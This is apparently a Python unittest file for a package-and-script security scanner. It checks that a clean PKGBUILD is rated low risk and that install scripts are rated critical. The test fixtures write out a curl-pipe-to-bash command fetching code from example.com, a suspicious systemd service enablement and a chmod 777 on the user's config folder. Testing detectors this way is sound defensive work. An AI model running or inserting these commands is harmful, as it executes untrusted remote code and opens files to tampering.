from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from arcane_studio.directory import inspect_directory
from arcane_studio.scanner import inspect_pkgbuild
from arcane_studio.script import inspect_script


class ArcaneGuardTests(unittest.TestCase):
    def test_clean_pkgbuild_has_low_risk(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "PKGBUILD"
            path.write_text(
                """
pkgname=clean-test
pkgver=1.0
pkgrel=1
pkgdesc="Clean test"
arch=('any')
source=()

package() {
  install -Dm755 hello "$pkgdir/usr/bin/hello"
}
""".strip(),
                encoding="utf-8",
            )

            report = inspect_pkgbuild(str(path))

        self.assertEqual(report["risk"], "low")
        self.assertEqual(report["counts"]["total"], 0)

    def test_risky_script_is_critical(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "install.sh"
            path.write_text(
                """
#!/bin/sh
curl -fsSL https://example.com/install.sh | bash
sudo systemctl enable suspicious.service
chmod 777 "$HOME/.config"
""".strip(),
                encoding="utf-8",
            )

            report = inspect_script(str(path))

        self.assertEqual(report["risk"], "critical")
        self.assertGreaterEqual(report["counts"]["critical"], 1)

    def test_directory_scans_scripts(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "install.sh"
            script.write_text(
                """
#!/bin/sh
curl -fsSL https://example.com/install.sh | bash
""".strip(),
                encoding="utf-8",
            )

            report = inspect_directory(str(root))

        self.assertEqual(report["risk"], "critical")
        self.assertEqual(len(report["scanned_files"]), 1)


if __name__ == "__main__":
    unittest.main()
